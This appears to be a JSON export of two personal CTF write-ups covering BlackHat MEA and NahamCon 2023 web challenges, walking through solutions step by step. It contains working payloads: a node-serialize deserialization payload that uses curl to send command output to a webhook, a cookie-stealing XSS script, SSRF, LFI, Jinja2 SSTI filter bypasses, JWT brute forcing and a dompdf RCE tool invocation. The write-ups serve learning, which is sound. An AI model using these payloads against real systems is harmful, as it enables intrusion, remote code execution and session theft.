[{"content":"web challenge - Spatify and here once we open challenge\ni see there is music called learn SQL mmm ok lets explore more as usual check the robots.txt and there is admin page in /superhiddenadminpanel/ endpoint shown in fig here is admin page look like\nbasicly we need a password to log in i tried to inject in admin panel but its useless back to main page of chall trying to add \u0026rsquo; \u0026gt; its need to add 5 chars so tried with \u0026rsquo;\u0026rsquo;\u0026rsquo;\u0026rsquo; and nothing tried with some special chars like * and % and here we go i see % success and give us\ngive us endpoint to /static/audio/secret_password_backup.txt.bak contains admin password back to log in with password and here we got the flag\nflag : BlackHatMEA{957:14:5949fdc31b4bf2f1561b678a8e9fe4fa617dd280}\nweb challenge - peeHpee we got this once we open the challenge\nchecking the source endpoint commented in the source code\n\u0026quot;Check /?source= for the source code --\u0026gt; \u0026quot; by give a look in code .. we have an ( email - test - pass ) parametrs and we have a valied email and password once we trying to log in with creds login failed casue test param missed added test parameter and by pass the $x to escape regex look like this\nand we suceefull login and here is our flag\nflag : BlackHatMEA{957:17:213fbe52ba8275bc20949ce56d069f56f9bc9095}\nWeb challenge - Meme Generator by clicking in VIEW SAUCE we gotta this\nlets explain what hapenning :\u0026gt; @app.route / flag \u0026raquo; mean we should request /flag to print our flag reguser_addr = \u0026quot; 127.0.0.1\u0026quot; \u0026raquo;its mean we need domain refere to local host request.url.startwith l0calhost \u0026raquo; mean we need subdomain start with l0calhost port 8080 \u0026raquo; mean port 8080 lol :\u0026gt; conclude : we need a subdomain start with l0calhost refers to local host with port 8080 and in the end /flag we have 2 ways to got this\nusing localtest.me and pass it our subdomain and port like this http://l0calhost.localtest.me:8080/flag\nor using fbi domain lmao will work too [http://l0calhost.fbi.com:8080/flag FBI OPEN UP you can try ping will work and refere to locaã host lol secound question is .. where should we inject this subdomain ? in fact i dont know wait wait im joking i have two solution lets explain: first one inect as xss with document.location will work after trying i can perform there is XSS and we can use it to complete this mission by passing this payloed to test\u0026quot;\u0026gt;\u0026quot;+document.location=http://l0calhost.fbi.com/flag \u0026amp; OR test\u0026quot;\u0026gt;\u0026quot;+document.locationhttp://l0calhost.fbi.com:8080/flag this way will success and print the flag in same page scound way is : inject using curl \u0026amp; ngrok\ncurl -X POST \u0026ndash;url \u0026ldquo;https://blackhat3-12467700c2749bd40efb1308b4b070f9-0.chals.bh.ctf.sa/api/generate\u0026quot; -F search_engine=88fc-113-173-115-76.ngrok.io?nani= -F query=123\nso : 88fc-113-173-115-76.ngrok.io points to my local server, that will sends a 302 response back to l0calhost.localtest.me:8080/flag and also success with both ways we can get the flag flag : BlackHatMEA{957:22:0907a3bda393a68b4fde6e35b2b599f9d67c3b99}\nweb challenge - Black Note once we open challenge we gotta this\nSign up with random creds , Fuzzing ,cheking source code as usal , when i loged in i can see another page\ntyped any thing and captured request\nyes i noticed notes cookie is base64 lets decode it \u0026gt;\u0026gt;{\u0026quot;notes\u0026quot;:{\u0026quot;0\u0026quot;:Sample Note \u0026quot;,\u0026quot;1\u0026quot;:\u0026quot;hello word\u0026quot;}}\nseems intersting i start play with this notes untill i gotta error\nnode-selalize \u0026raquo; this make us think about deserialization attack , i start searching in google and found article RCE in nodeJS via deserialization attack here is the link of article : https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/ cool lets start the exploite here is our payloed :\n{\u0026quot;notes\u0026quot;:{\u0026quot;0\u0026quot;:\u0026quot;_$$ND_FUNC$$_function (){require(\\'child_process\\').exec(\\'curl \u0026lt;your webhook url\u0026gt; -d \\\\\u0026quot;ls=$(ls /)\\\\\u0026quot; /\\', function(error, stdout, stderr) { console.log(stdout) });}()\u0026quot;}} just we eant to pass our webhook url or any interaction server will work https://webhook.site/ After that we should decode payloed again and pass it in notes with webhook url and see if we gotta response or no and yes we got response in webhook\ncool , lets read flag \u0026ldquo;ranDom_fl4gImportant.txt\u0026rdquo;\nedit payloed and replace ls to cat /ranDom_fl4gImportant.txt and return to webhook and yes here is the flag\nflag :BlackHatMEA{981:18:ee542016dc185cd06c6adbdd034c8e19d7780d7d}\nweb challenge - Jimmy’s Blog Hard\nDescription: The technology is always evolving, so why do we still stick with password-based authentication? That makes no sense! That’s why I designed my own password-less login system. I even open-sourced it for everyone interested, how nice of me!\n(@Rpi9) and (@0_Zero_0) solved this challenge together.\nwe were given a website link and the challenge (\u0026quot;Source Code\u0026rdquo;)\nwe went to the website to take a look at what it does and it is a blog for someone named Jimmy\nwith Login, Register and Article Page.\nNvm, we read those articles to know what Jimmy published in his Blog\nits basically an authentication system without needing a password\njust a username and the site automatically generates an encryption key for you to be able to login.\nthat is the main idea \\ next step is to check the site but in a dynamic way try it i mean, so we basically went to register page and created an account with username hecker :/:\nas you see it generated a key with the name we typed with .key ext\nwe tried to make another account with the same username but nope it said username already taken xd\nalso we tried to read this key but wasn\u0026rsquo;t useful, next step is to try the login\nit asks for the username and the access key were given while creating your account.\nafter we logged in just the same article page and Logout button lol?\nwe noticed that there is nothing interesting here, so we moved to the source code\nwe fired node to run the blog locally we started the fight :D\nwe read the basic main files [ run.sh, note.txt, nginx.conf, Dockerfile ]\nnope nothing there, so let\u0026rsquo;s review the juicy javascript code xd\nwe started with index.js it just routing the requests /login, /register..etc\nbut But there was something that caught my attention | those two functions\n1- Show the content of the articles but you should be an admin\n` app.get(\u0026quot;/edit\u0026quot;, (req, res) =\u0026gt; { if (!req.session.admin) return res.sendStatus(401); const id = parseInt(req.query.id).toString(); const article_path = path.join(\u0026quot;articles\u0026quot;, id); try { const article = fs.readFileSync(article_path).toString(); res.render(\u0026quot;edit\u0026quot;, { article: article, session: req.session, flag: process.env.FLAG }); } catch { res.sendStatus(404); } }) ` first one is check if there is a session admin to be able to see the content the edit articles as you see there is flag: process.env.FLAG being render\n2- Edit The Content of the articles\n` app.post(\u0026quot;/edit\u0026quot;, (req, res) =\u0026gt; { if (!req.session.admin) return res.sendStatus(401); try { fs.writeFileSync(path.join(\u0026quot;articles\u0026quot;, req.query.id), req.body.article.replace(/\\r/g, \u0026quot;\u0026quot;)); res.redirect(\u0026quot;/\u0026quot;); } catch { res.sendStatus(404); } }) ` it\u0026rsquo;s an endpoint only admins can access it to edit the articles without filtering the content so that means we can found path traversal vulnerability, so how can we be admins?\u0026hellip; fine let\u0026rsquo;s continue reading the code\nso next file was this edit.ejs of course to see how this file prints the flag | nothing was interested but one thing was\n` \u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;%- include('head.ejs') %\u0026gt; \u0026lt;body class=\u0026quot;text-dark bg-light\u0026quot;\u0026gt; \u0026lt;%- include('navbar.ejs') %\u0026gt; \u0026lt;div class=\u0026quot;container my-5 px-5\u0026quot;\u0026gt; \u0026lt;h3 class=\u0026quot;text-center\u0026quot;\u0026gt;Welcome jimmy_jammy, your flag is\u0026lt;/h3\u0026gt; \u0026lt;p class=\u0026quot;mb-5 text-center\u0026quot;\u0026gt;\u0026lt;%= flag %\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;h3\u0026gt;Meanwhile, please feel free to edit your article\u0026lt;/h3\u0026gt; \u0026lt;form method=\u0026quot;POST\u0026quot;\u0026gt; \u0026lt;textarea class=\u0026quot;form-control mb-3\u0026quot; rows=\u0026quot;15\u0026quot; name=\u0026quot;article\u0026quot;\u0026gt;\u0026lt;%= article %\u0026gt;\u0026lt;/textarea\u0026gt; \u0026lt;button type=\u0026quot;submit\u0026quot; class=\u0026quot;btn btn-dark w-100\u0026quot;\u0026gt;Save Changes\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;%- include('scripts.ejs') %\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ` html tag with \u0026lt;h3\u0026gt; Welcome jimmy_jammy\u0026lt;/h3\u0026gt;\nwe realized that this the admin name because the blog named jimmy\u0026rsquo;s blog so this 90% the admin username next step is to find a way to login in as jimmy_jammy.\nso we started see the main authentication files (register.ejs, login.ejs)\nand the common file in all files was (utils.js) so we started with it\nutils.js is contains the main functions of Database inserting users, login check\nthere is username registered jimmy_jammy and admin value is 1\nif you noticed that in register function admin = 0 for normal users\nline 21 it looks like the script is not filtering the value so why we don\u0026rsquo;t give a try for path traversal vulnerability. :::\nso why we don\u0026rsquo;t give it a try to register but using the vulnerability on our side\nlet\u0026rsquo;s get into the first exploit:\nFirst step creating a user with this username to get the key of the admin ( jimmy_jammy ) =\u0026gt; username: ../keys/jimmy_jammy Great, we got the admin\u0026rsquo;s encryption key now we can login as the admin |^:^/\nCool!, since we became admins, so we can view edit page and get our flag!,\nHuh? is that my flag really? nvm we checked all files but we returned back to see if we missed something and yeah we missed the ngnix.conf file\n` server { listen 80 default_server; listen [::]:80 default_server; server_name _; location / { # Replace the flag so nobody steals it! sub_filter 'placeholder_for_flag' 'oof, that was close, glad i was here to save the day'; sub_filter_once off; proxy_pass http://localhost:3000; } } ` Oops, Flag is being replaced # Replace the flag so nobody steals it!\nsub_filter 'placeholder_for_flag' 'oof, that was close, glad i was here to save the day';\nso we can\u0026rsquo;t continue locally\nNote: Don\u0026rsquo;t forget we have a path traversal in edit page via id parameter.\nwhile writeFileSyncwhich()allows us to re-write the file content to whatever we want so why we don\u0026rsquo;t get a Nice RCE :D\nvia SSTI (Server Side Template Injection) we can determine the vulnerability by following this endpoint ?id=../views/navbar.ejs\nactually i forgot to take a screenshot of the SSTI but trust me it is vulnerable :DD\nlet\u0026rsquo;s continue after we determined the vuln exists next move is to get RCE\nbut instead of this we will bruteforce the flag and print it in all articles pages\nbecause we solved many challs like this so bruteforce was our first choice.\nby overriding the article file with following script\n` \u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;%- include('head.ejs') %\u0026gt; \u0026lt;body class=\u0026quot;text-dark bg-light\u0026quot;\u0026gt; \u0026lt;%- include('navbar.ejs') %\u0026gt; \u0026lt;div class=\u0026quot;container my-5 px-5\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;card mb-4\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;card-header\u0026quot;\u0026gt; \u0026lt;%= article.date %\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;card-body\u0026quot;\u0026gt; \u0026lt;h5 class=\u0026quot;card-title\u0026quot;\u0026gt;\u0026lt;%= article.title %\u0026gt;\u0026lt;/h5\u0026gt; \u0026lt;p class=\u0026quot;card-text\u0026quot;\u0026gt; \u0026lt;%= article.summary %\u0026gt; \u0026lt;hr class=\u0026quot;mb-0\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;pre-line\u0026quot;\u0026gt; \u0026lt;%= article.content %\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026quot;card-footer text-muted\u0026quot;\u0026gt; \u0026lt;% for (var i =0; i \u0026lt;=59; i++ ) { %\u0026gt; \u0026lt;%= flag[i] %\u0026gt; \u0026lt;% } %\u0026gt; Generated by shriperis \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;%- include('scripts.ejs') %\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ` so we intercepted the request while we editing any article and we used the vuln via id param and the endpoint was ?id=../views/navbar.ejs then we encoded our js payload as a url-encoded and we replaced article value to our script\nand we forwarded the request and guess!\nBingo! Thanks For Reading..!\n","permalink":"https://0ozero0.github.io/write-ups/blackhatmea/web-challenges/writeup/","summary":"web challenge - Spatify and here once we open challenge\ni see there is music called learn SQL mmm ok lets explore more as usual check the robots.txt and there is admin page in /superhiddenadminpanel/ endpoint shown in fig here is admin page look like\nbasicly we need a password to log in i tried to inject in admin panel but its useless back to main page of chall trying to add \u0026rsquo; \u0026gt; its need to add 5 chars so tried with \u0026rsquo;\u0026rsquo;\u0026rsquo;\u0026rsquo; and nothing tried with some special chars like * and % and here we go i see % success and give us","title":"black-Hat-MEA-CTF | ALL Web challenges "},{"content":"Museum Challenge When accessing the web app, the following page is displayed While attempting to view an image using the following URL format: http://challenge.nahamcon.com:31368/browse?artifact=angwy.jpg, I noticed that the application calls the image through the ?artifact parameter. Exploiting this behavior, I attempted a Local File Inclusion (LFI) attack by modifying the URL to access sensitive files such as /.etc/passwd. However, I encountered an obstacle as I couldn\u0026rsquo;t directly read the flag. As a result, I started investigating the location of the application by exploring /proc/self/cmdline. reading source of application\n/home/museum/app.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 from flask import Flask, request, render_template, send_from_directory, send_file, redirect, url_for import os import urllib import urllib.request app = Flask(__name__) @app.route(\u0026#39;/\u0026#39;) def index(): artifacts = os.listdir(os.path.join(os.getcwd(), \u0026#39;public\u0026#39;)) return render_template(\u0026#39;index.html\u0026#39;, artifacts=artifacts) @app.route(\u0026#34;/public/\u0026lt;file_name\u0026gt;\u0026#34;) def public_sendfile(file_name): file_path = os.path.join(os.getcwd(), \u0026#34;public\u0026#34;, file_name) if not os.path.isfile(file_path): return \u0026#34;Error retrieving file\u0026#34;, 404 return send_file(file_path) @app.route(\u0026#39;/browse\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def browse(): file_name = request.args.get(\u0026#39;artifact\u0026#39;) if not file_name: return \u0026#34;Please specify the artifact to view.\u0026#34;, 400 artifact_error = \u0026#34;\u0026lt;h1\u0026gt;Artifact not found.\u0026lt;/h1\u0026gt;\u0026#34; if \u0026#34;..\u0026#34; in file_name: return artifact_error, 404 if file_name[0] == \u0026#39;/\u0026#39; and file_name[1].isalpha(): return artifact_error, 404 file_path = os.path.join(os.getcwd(), \u0026#34;public\u0026#34;, file_name) if not os.path.isfile(file_path): return artifact_error, 404 if \u0026#39;flag.txt\u0026#39; in file_path: return \u0026#34;Sorry, sensitive artifacts are not made visible to the public!\u0026#34;, 404 with open(file_path, \u0026#39;rb\u0026#39;) as f: data = f.read() image_types = [\u0026#39;jpg\u0026#39;, \u0026#39;png\u0026#39;, \u0026#39;gif\u0026#39;, \u0026#39;jpeg\u0026#39;] if any(file_name.lower().endswith(\u0026#34;.\u0026#34; + image_type) for image_type in image_types): is_image = True else: is_image = False return render_template(\u0026#39;view.html\u0026#39;, data=data, filename=file_name, is_image=is_image) @app.route(\u0026#39;/submit\u0026#39;) def submit(): return render_template(\u0026#39;submit.html\u0026#39;) @app.route(\u0026#39;/private_submission_fetch\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def private_submission_fetch(): url = request.args.get(\u0026#39;url\u0026#39;) if not url: return \u0026#34;URL is required.\u0026#34;, 400 response = submission_fetch(url) return response def submission_fetch(url, filename=None): return urllib.request.urlretrieve(url, filename=filename) @app.route(\u0026#39;/private_submission\u0026#39;) def private_submission(): if request.remote_addr != \u0026#39;127.0.0.1\u0026#39;: return redirect(url_for(\u0026#39;submit\u0026#39;)) url = request.args.get(\u0026#39;url\u0026#39;) file_name = request.args.get(\u0026#39;filename\u0026#39;) if not url or not file_name: return \u0026#34;Please specify a URL and a file name.\u0026#34;, 400 try: submission_fetch(url, os.path.join(os.getcwd(), \u0026#39;public\u0026#39;, file_name)) except Exception as e: return str(e), 500 return \u0026#34;Submission received.\u0026#34;, 200 if __name__ == \u0026#39;__main__\u0026#39;: app.run(debug=False, host=\u0026#34;0.0.0.0\u0026#34;, port=5000) To exploit the /private_submission_fetch and /private_submission endpoints, you need to provide specific parameters. Based on the code you mentioned, the following payload can be constructed:\nThe URL parameter for /private_submission_fetch should be set to http://127.0.0.1:5000/private_submission?url=file:///flag.txt\u0026amp;filename=test.txt. This payload aims to visit the localhost (127.0.0.1) and access the /private_submission endpoint with the url parameter set to file:///flag.txt to read the flag file, and the filename parameter can be set to any desired value (in this case, test.txt). http://challenge.nahamcon.com:31368/private_submission_fetch?url=http%3A%2F%2F127.0.0.1%3A5000%2Fprivate_submission%3Furl%3Dfile%3A%2F%2F%2Fflag.txt%26filename%3Dtest.txt\nby opening test.txt will get the flag Obligatory - Medium sign up and log in the web site looking to Task Created\nAfter creating a task, the website displays a success message with the parameter \u0026ldquo;success\u0026rdquo; in the URL. For example, the URL might look like this: http://challenge.nahamcon.com:30192/?success=Task%20created.\nI attempted to exploit the website\u0026rsquo;s vulnerability to Server-Side Template Injection (SSTI) by injecting the expression {{7*7}} into the \u0026ldquo;success\u0026rdquo; parameter. As a result, the server processed the SSTI payload successfully, and the response displayed the value \u0026ldquo;49\u0026rdquo; (since 7 multiplied by 7 equals 49). This confirms the existence of an SSTI vulnerability.\nFurthermore, I tried injecting the payload {{config.items()}} to retrieve information about the configuration. However, it seems that the application applies some filters or restrictions, preventing the complete execution of the payload. great resource https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti\nThe suggested payload involves replacing underscores (_) with the hexadecimal representation \\x5f. The final payload would be as follows: {{self|attr(\u0026quot;\\x5f\\x5fdict\\x5f\\x5f\u0026quot;)}}\nThis payload aims to access the __dict__ attribute of the self object within the template context. By doing so, it retrieves the dictionary representing the attributes of the self object and renders it as the output in the template.\nWe have a secret key: \u0026ldquo;\u0026amp;GTHN\u0026amp;Ngup3WqNm6q$5nPGSAoa7SaDuY\u0026rdquo; that needs to be used for signing. To sign a cookie value and obtain the desired output, we can use the following command:\n`flask-unsign \u0026ndash;sign \u0026ndash;cookie \u0026ldquo;{\u0026lsquo;id\u0026rsquo;:1}\u0026rdquo; \u0026ndash;secret \u0026ldquo;\u0026amp;GTHN\u0026amp;Ngup3WqNm6q$5nPGSAoa7SaDuY\u0026rdquo;\nThis command generates a signed value. In this case, the signed value is \u0026ldquo;eyJpZCI6MX0.ZJCZvA.Gv1dLHOlcliDKWFv8C1lehZT84o\u0026rdquo;. By replacing the cookie value with this signed value, it should provide us with access to the flag.` Marmalade 5 web challenge look like when entering any username i noticed the web use jwt tokn trying common exploit but not works so i tried to genertate error give me this hint To brute force the remaining 5 characters using john and the jwt.txt file, you can use either of the following commands:\njohn.exe jwt.txt --wordlist=wordlist.txt --format=HMAC-MD5 or john token --mask=fsrwjcfszeg?l?l?l?l?l --format=HMAC-MD5\nAfter running the command, you will obtain the remaining characters, which are vsyfa. To forge the correct token with the new secret, you need to replace the existing JWT token with the new one. The resulting token will be:\neyJhbGciOiAiTUQ1X0hNQUMifQ.eyJ1c2VybmFtZSI6ICJhZG1pbiJ9.fWg2jgheCvPc4WaNSmAVEQ==\rUsing this modified token, you can then proceed to achieve your desired goal or obtain the flag\nStar Wars after sign in blog page appear with commant section\nAfter attempting to comment, the command will be sent for admin review, potentially leading to XSS. The following payload, or another similar payload, can be utilized: \u0026lt;script\u0026gt; var i = new Image;\ri.src = \u0026quot;http://webhook/?\u0026quot; + document.cookie; \u0026lt;/script\u0026gt; By inspecting the webhook, the admin\u0026rsquo;s cookie can be identified. By replacing the cookie, the flag can be obtained. For further details, refer to the following link: XSS Reflected Steal Cookie.\nStickers This challenge the same machine i solved it in HTB once we open the challenge will get form need to complete then after complete the form will downlad the pdf after submit will get this request\nsearhing for php pdf exploits and found this cool tool https://github.com/rvizx/CVE-2022-28368\npython3 dompdf-rce.py \u0026ndash;inject \u0026ldquo;GET request \u0026quot; \u0026ndash;dompdf \u0026ldquo;challenge url \u0026quot;\nrce and then the flag\n","permalink":"https://0ozero0.github.io/write-ups/nahamcon-ctf-2023/webchallenges/","summary":"Museum Challenge When accessing the web app, the following page is displayed While attempting to view an image using the following URL format: http://challenge.nahamcon.com:31368/browse?artifact=angwy.jpg, I noticed that the application calls the image through the ?artifact parameter. Exploiting this behavior, I attempted a Local File Inclusion (LFI) attack by modifying the URL to access sensitive files such as /.etc/passwd. However, I encountered an obstacle as I couldn\u0026rsquo;t directly read the flag. As a result, I started investigating the location of the application by exploring /proc/self/cmdline.","title":""}]